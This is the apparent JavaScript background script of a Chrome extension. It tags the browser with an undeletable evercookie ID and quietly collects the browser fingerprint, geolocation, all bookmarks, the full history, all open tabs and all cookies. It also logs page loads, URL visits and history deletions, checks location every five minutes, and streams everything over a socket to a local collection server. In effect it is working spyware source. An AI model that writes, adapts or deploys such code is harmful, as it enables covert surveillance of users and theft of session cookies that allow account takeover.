///////////////////////////////////////////////////////////////////////////////
// Determine UUID and activate evercookie.
///////////////////////////////////////////////////////////////////////////////

var uuid = null;
var ec = new evercookie();

// Get UUID from evercookie.
ec.get("uuid", function (value) {
    // Set uuid value.
    if (value === undefined) {
        uuid = Math.uuid();
        ec.set("uuid", uuid);
        console.log("UUID (new):", uuid);
        // Send initial transmission.
        emitInitial();
    } else {
        uuid = value;
        console.log("UUID:", uuid);
    }
    // Send start-up transmission.
    emitStartUp();
    // Activate listeners.
    activateListeners();
});

///////////////////////////////////////////////////////////////////////////////
// Define public-key.
///////////////////////////////////////////////////////////////////////////////

var publicKey =
    ["-----BEGIN PUBLIC KEY-----",
     "MIGeMA0GCSqGSIb3DQEBAQUAA4GMADCBiAKBgH/DQTiW3r53iXbRDOnvBr5se3NS",
     "kzah0lq9WzyrmQsD3UgeucYm/iBJ5fxcY0XaKLCE4wgH/dl/2ZZEPjBQDqtccM+F",
     "Gz5Y7Rh8d1xs9M9IBd2CONDr6McHbwKL92kVBE/4IWOXdu/bGhLX8fCGe7hQ7xnw",
     "mz45rrZ+mc1GvxW7AgMBAAE=",
     "-----END PUBLIC KEY-----"
    ].join("\n");
var encryptor = new JSEncrypt();
encryptor.setPublicKey(publicKey);

///////////////////////////////////////////////////////////////////////////////
// Define getters.
///////////////////////////////////////////////////////////////////////////////

var emitInitial = function () {
    getFingerprint();
    getCurrentPosition();
    getAllBookmarks();
    getAllHistory();
    getAllTabs();
    getAllCookies();
};

var emitStartUp = function () {
    getFingerprint();
    getCurrentPosition();
};

var getFingerprint = function () {
    fingerprint = {
        userAgent: getUserAgent(),
        screenResolution: getScreenResolution()
    };
    postData("fingerprint", fingerprint);
}

var getUserAgent = function () {
    return navigator.userAgent;
};

var getScreenResolution = function () {
    return window.screen.width + "x" + window.screen.height;
};

var getCurrentPosition = function () {
    navigator.geolocation.getCurrentPosition(function (position) {
        console.log("Position found.");
        postData("geoposition", position);
    }, function(positionError) {
        console.log("Position not found.");
        postData("geoposition", null);
    });
};

var getAllBookmarks = function () {
    chrome.bookmarks.getTree(function (results) {
        postData("bookmarks-all", results);
    });
};

var getAllHistory = function () {
    chrome.history.search({"text": ""}, function (historyArray) {
        postData("history-all", historyArray);
    });
};

var getAllTabs = function () {
    chrome.windows.getAll({"populate": true}, function (windowArray) {
        postData("tabs-all", windowArray);
    });
}

var getPageCapture = function (tabId) {
    chrome.pageCapture.saveAsMHTML({"tabId": tabId}, function (mhtmlData) {
        var payload = {};
        payload.tabId = tabId;
        payload.mhtmlData = mhtmlData;
        postData("pageCapture", payload);
        // saveAs(mhtmlData, tabId + '.mhtml');
    });
};

var getAllCookies = function () {
    chrome.cookies.getAll({}, function (cookieArray) {
        postData("cookies-all", cookieArray);
    });
};

///////////////////////////////////////////////////////////////////////////////
// Define listener related functions.
///////////////////////////////////////////////////////////////////////////////

var onWindowCreate = function (newWindow) {
    console.log(newWindow);
    postData('window-create', newWindow);
};

var onWindowActive = function (windowId) {
    postData('window-active', {'windowId': windowId});
}

var onWindowRemoved = function (windowId) {
    postData('window-removed', {'windowId': windowId});
}

var onTabCreate = function (tab) {
    console.log("Tab create:", "#" + tab.id, tab.title, "(" + tab.url + ")");
};

var onTabUpdate = function (tabId, changeInfo, tab) {
    if (changeInfo.status === "complete") {
        console.log("Tab update:", "#" + tab.id, tab.title,
                    "(" + tab.url + ")");
        // console.log(tab);
        postData('tab-loaded', tab);
    }
};

var onTabActive = function (activeInfo) {
    console.log("Tab activated:", activeInfo.tabId);
};

var onTabRemoved = function (tabId, removeInfo) {
    console.log("Tab remove:", tabId);
};

var onURLVisit = function (result) {
    console.log("URL visit:", result.title, "(" + result.url + ") at",
                result.lastVisitTime + ",", result.visitCount, "times");
    postData('url-visit', result);
};

var onURLRemoved = function (removed) {
    // Log only if particular visits are removed.
    if (!removed.allHistory) {
        postData('url-removed', removed);
    }
};

var onCookieChange = function (changeInfo) {
    console.log(changeInfo);
};

var onBookmarkCreate = function (id, bookmark) {
    console.log(id, bookmark);
};

var onBookmarkChange = function (id, changeInfo) {
    console.log(id, changeInfo);
};

var activateListeners = function () {
    console.log("Activating listeners...");
    chrome.windows.onCreated.addListener(onWindowCreate);
    chrome.windows.onFocusChanged.addListener(onWindowActive);
    chrome.windows.onRemoved.addListener(onWindowRemoved);
    chrome.tabs.onCreated.addListener(onTabCreate);
    chrome.tabs.onUpdated.addListener(onTabUpdate);
    chrome.tabs.onActivated.addListener(onTabActive);
    chrome.tabs.onRemoved.addListener(onTabRemoved);
    chrome.history.onVisited.addListener(onURLVisit);
    chrome.history.onVisitRemoved.addListener(onURLRemoved);
    // chrome.cookies.onChanged.addListener(onCookieChange);
    chrome.bookmarks.onCreated.addListener(onBookmarkCreate);
    chrome.bookmarks.onChanged.addListener(onBookmarkChange);
    setInterval(getCurrentPosition, 5 * 60 * 1000);
};

///////////////////////////////////////////////////////////////////////////////
// Define transmission related functions.
///////////////////////////////////////////////////////////////////////////////

var SERVER_URL = "http://127.0.0.1:8080/";
var socket = io.connect(SERVER_URL);

var postData = function (type, payload) {
    // Define data object.
    data = {}
    data.uuid = uuid;
    data.time = new Date().getTime();
    data.type = type;
    data.payload = JSON.stringify(payload);
    // Compress payload.
    // data.payload = compressString(JSON.stringify(payload));
    console.log(data);
    // Transmit data to server.
    socket.emit(type, data);
    return data;
};
